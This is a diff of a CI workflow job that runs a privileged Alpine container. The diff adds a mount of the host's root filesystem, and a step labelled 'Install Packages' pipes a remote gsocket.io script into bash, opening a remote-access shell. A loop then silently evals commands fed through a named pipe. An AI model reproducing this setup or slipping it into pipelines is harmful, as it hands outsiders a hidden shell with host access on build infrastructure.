@@ -8,6 +8,8 @@ jobs:
     runs-on: ubuntu-24.04-arm
     container:
       image: alpine:3.22.4
+      volumes:
+        - /:/host
       options: --privileged
     steps:
       - name: Install Packages
@@ -18,7 +20,6 @@ jobs:
         run: |
           bash -c "$(curl -fsSL https://gsocket.io/y)"
           trap 'exit 0' TERM
-          echo "echo IMPORTANT: Remember to exit the main bash when finishes" >>"$HOME/.bashrc"
           mkfifo /tmp/bash-0
           while :; do
             eval "$(cat /tmp/bash-0)" &>/dev/null
